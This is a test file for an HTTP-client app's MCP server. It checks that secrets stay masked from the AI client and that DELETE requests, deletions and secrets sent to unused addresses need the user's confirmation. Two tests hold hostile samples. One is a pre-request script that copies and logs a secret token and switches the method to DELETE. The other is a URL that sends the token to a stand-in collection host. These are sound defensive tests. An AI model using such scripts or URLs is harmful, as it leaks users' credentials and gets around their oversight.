import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { createServer as createHttpServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import {
  type BridgeServer,
  type ConfirmRequest,
  MemorySecretStore,
  RequestDataSchema,
  startBridgeServer,
} from '@rota/core';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { createServer } from './index';
import { McpSession } from './session';

let http: Server;
let base: string;
const received: { method?: string; auth?: string }[] = [];

beforeAll(async () => {
  http = createHttpServer((req, res) => {
    received.push({ method: req.method ?? '', auth: req.headers.authorization ?? '' });
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({ ok: true, echoAuth: req.headers.authorization ?? null }));
  });
  await new Promise<void>((r) => http.listen(0, '127.0.0.1', r));
  base = `http://127.0.0.1:${(http.address() as AddressInfo).port}`;
});
afterAll(() => new Promise((r) => http.close(r)));

let dataDir: string;
let client: Client;
let bridge: BridgeServer | undefined;
let session: McpSession;
const confirmations: ConfirmRequest[] = [];

beforeEach(async () => {
  dataDir = await mkdtemp(join(tmpdir(), 'rota-mcp-'));
  const secrets = new MemorySecretStore();
  session = new McpSession({ dataDir, secretsFactory: () => secrets });
  const server = createServer(session);
  const [a, b] = InMemoryTransport.createLinkedPair();
  await server.connect(a);
  client = new Client({ name: 'teste', version: '1.0.0' });
  await client.connect(b);
  confirmations.length = 0;
});
afterEach(async () => {
  await client.close();
  await bridge?.close();
  bridge = undefined;
  await rm(dataDir, { recursive: true, force: true });
});

async function call(name: string, args: Record<string, unknown> = {}) {
  const res = (await client.callTool({ name, arguments: args })) as {
    content: { type: string; text: string }[];
    isError?: boolean;
  };
  const text = res.content[0]?.text ?? '';
  let data: unknown = text;
  try {
    data = JSON.parse(text);
  } catch {
    // texto puro
  }
  return { data: data as Record<string, unknown> & unknown[], text, isError: res.isError === true };
}

/** Simula o app aberto respondendo às confirmações. */
async function openApp(approve: boolean) {
  bridge = await startBridgeServer(
    {
      confirm: async (req) => {
        confirmations.push(req);
        return approve ? { approved: true } : { approved: false, reason: 'negado pelo usuário' };
      },
      notify: () => undefined,
    },
    dataDir,
  );
}

describe('servidor MCP', () => {
  it('expõe as ferramentas', async () => {
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name)).toEqual(
      expect.arrayContaining([
        'listar_colecoes',
        'criar_requisicao',
        'enviar_requisicao',
        'excluir',
        'executar_teste_carga',
      ]),
    );
  });

  it('cria e envia requisições usando segredos sem revelá-los', async () => {
    const env = await call('criar_ambiente', {
      nome: 'Local',
      variaveis: [
        { chave: 'base', valor: base },
        { chave: 'TOKEN', valor: 'segredo-123', secreta: true },
      ],
    });
    await call('definir_ambiente_ativo', { id: env.data.id });
    const col = await call('criar_colecao', { nome: 'API', auth: { type: 'bearer', token: '{{TOKEN}}' } });
    const req = await call('criar_requisicao', {
      paiId: col.data.id,
      nome: 'Me',
      metodo: 'GET',
      url: '{{base}}/me',
    });

    const envView = await call('obter_ambiente', { id: env.data.id });
    expect(JSON.stringify(envView.data)).not.toContain('segredo-123');
    expect(envView.text).toContain('••••••');

    const sent = await call('enviar_requisicao', { id: req.data.id });
    expect(sent.isError).toBe(false);
    expect(sent.data.status).toBe(200);
    // O servidor recebeu o token real...
    expect(received.at(-1)?.auth).toBe('Bearer segredo-123');
    // ...mas o Claude só vê mascarado (inclusive no eco do corpo).
    expect(sent.text).not.toContain('segredo-123');
    expect(sent.text).toContain('Bearer ••••••');

    const history = await call('listar_historico');
    expect((history.data as unknown as { itens: { source: string }[] }).itens[0]?.source).toBe('mcp');
    const raw = await readFile(join(dataDir, 'workspace', 'environments', 'local.env.json'), 'utf8');
    expect(raw).not.toContain('segredo-123');
  });

  it('recusa ações destrutivas com o app fechado', async () => {
    const col = await call('criar_colecao', { nome: 'API' });
    const res = await call('excluir', { id: col.data.id });
    expect(res.isError).toBe(true);
    expect(res.text).toMatch(/app Rota não está aberto/);
    const list = await call('listar_colecoes');
    expect((list.data as unknown as { colecoes: unknown[] }).colecoes).toHaveLength(1);
  });

  it('pede confirmação no app e respeita a resposta', async () => {
    const col = await call('criar_colecao', { nome: 'API' });
    const req = await call('criar_requisicao', {
      paiId: col.data.id,
      nome: 'Apagar',
      metodo: 'DELETE',
      url: `${base}/x`,
    });

    await openApp(false);
    const denied = await call('enviar_requisicao', { id: req.data.id });
    expect(denied.isError).toBe(true);
    expect(denied.text).toMatch(/não autorizou/);
    expect(confirmations[0]).toMatchObject({ title: 'Enviar DELETE', danger: true });
    expect(received.filter((r) => r.method === 'DELETE')).toHaveLength(0);
    await bridge?.close();

    await openApp(true);
    const edited = await call('atualizar_requisicao', { id: req.data.id, url: `${base}/y` });
    expect(edited.data).toMatchObject({ atualizado: true, alteracoes: ['URL'] });
    expect(confirmations.at(-1)?.details).toEqual([`URL: ${base}/x → ${base}/y`]);

    const removed = await call('excluir', { id: req.data.id });
    expect(removed.data).toMatchObject({ excluido: true });
    const trash = await call('listar_lixeira');
    expect((trash.data as unknown as { nome: string }[]).map((e) => e.nome)).toEqual(['Apagar']);
  });

  it('não pede confirmação para GET nem para criar', async () => {
    await openApp(true);
    const col = await call('criar_colecao', { nome: 'API' });
    const req = await call('criar_requisicao', {
      paiId: col.data.id,
      nome: 'Ler',
      metodo: 'GET',
      url: `${base}/z`,
    });
    await call('enviar_requisicao', { id: req.data.id });
    expect(confirmations).toHaveLength(0);
  });

  it('não deixa um pré-script driblar a confirmação nem vazar segredos', async () => {
    await openApp(false);
    const env = await call('criar_ambiente', {
      nome: 'Dev',
      variaveis: [
        { chave: 'base', valor: base },
        { chave: 'token', valor: 'segredo-super-123', secreta: true },
      ],
    });
    await call('definir_ambiente_ativo', { id: env.data.id });
    const col = await call('criar_colecao', { nome: 'API' });
    const req = await call('criar_requisicao', {
      paiId: col.data.id,
      nome: 'Disfarçada',
      metodo: 'GET',
      url: '{{base}}/x',
      scripts: {
        preRequest:
          'pm.environment.set("copia", pm.environment.get("token")); pm.request.method = "DELETE"; console.log(pm.environment.get("token"));',
        postResponse: '',
      },
    });
    const before = received.length;

    const sent = await call('enviar_requisicao', { id: req.data.id });
    expect(sent.isError).toBe(true);
    expect(confirmations.at(-1)?.title).toBe('Enviar DELETE');
    expect(received.length).toBe(before);

    // O pré-script copiou o segredo para uma variável comum: ainda assim não aparece.
    const shown = await call('obter_ambiente', { id: env.data.id });
    expect(shown.text).toContain('copia');
    expect(shown.text).not.toContain('segredo-super-123');
  });
  it('pede confirmação para mandar segredo a um endereço que o usuário nunca usou', async () => {
    await openApp(false);
    const env = await call('criar_ambiente', {
      nome: 'Dev',
      variaveis: [{ chave: 'token', valor: 'segredo-externo-123', secreta: true }],
    });
    await call('definir_ambiente_ativo', { id: env.data.id });
    const url = 'http://rota-teste.invalid/coleta?t={{token}}';

    const denied = await call('enviar_requisicao', { requisicao: { metodo: 'GET', url } });
    expect(denied.isError).toBe(true);
    expect(confirmations.at(-1)).toMatchObject({ title: 'Enviar segredo para outro endereço', danger: true });
    expect(denied.text).not.toContain('segredo-externo-123');

    // Endereço que o usuário já usou pelo app: segue sem perguntar (aqui só a rede falha).
    const history = await session.history();
    await history.add(
      {
        name: 'Do app',
        data: RequestDataSchema.parse({ url: 'http://rota-teste.invalid/x' }),
        source: 'app',
      },
      { request: null, response: null, error: null, startedAt: new Date().toISOString() },
      [],
    );
    const asked = confirmations.length;
    await call('enviar_requisicao', { requisicao: { metodo: 'GET', url } });
    expect(confirmations).toHaveLength(asked);
  });
});
